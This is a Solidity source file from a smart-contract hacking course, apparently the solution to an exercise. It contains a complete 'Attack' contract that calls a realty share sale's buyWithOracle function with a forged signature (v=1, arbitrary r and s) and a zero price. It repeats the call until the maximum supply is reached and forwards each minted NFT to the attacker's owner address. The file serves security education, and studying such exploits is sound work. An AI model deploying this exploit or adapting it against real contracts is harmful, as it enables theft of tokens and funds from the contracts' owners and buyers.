// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity 0.8.13;

import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./RealtyToken.sol";

/**
 * @title RealtySaleEIP712
 * @author JohnnyTime (https://smartcontractshacking.com)
 */

struct SharePrice {
    uint256 expires; // Time which the price expires
    uint256 price; // Share Price in ETH
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

interface IRealtySale {
    function shareToken() external returns(address);
    function buyWithOracle(SharePrice calldata sharePrice, Signature calldata signature) external payable;
}

interface IRealtyToken is IERC721 {
    function lastTokenID() external returns (uint256);

    function maxSupply() external returns (uint256);
}

contract Attack is Ownable {
    address private realtyToken;
    address private realtySale;

    constructor(address _saleContractAddress) {
        realtySale = _saleContractAddress;
        realtyToken = IRealtySale(realtySale).shareToken();
    }

    function attack() external onlyOwner {
        SharePrice memory price = SharePrice(block.timestamp + 99999, 0);
        Signature memory signature = Signature(1, keccak256("random"), keccak256("random"));

        uint256 currentTokenId = IRealtyToken(realtyToken).lastTokenID();
        uint256 maxSupply = IRealtyToken(realtyToken).maxSupply();

        while (currentTokenId < maxSupply) {
            IRealtySale(realtySale).buyWithOracle(price, signature);
            currentTokenId += 1;
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        IRealtyToken(realtyToken).transferFrom(address(this), owner(), tokenId);
        return this.onERC721Received.selector;
    }

}
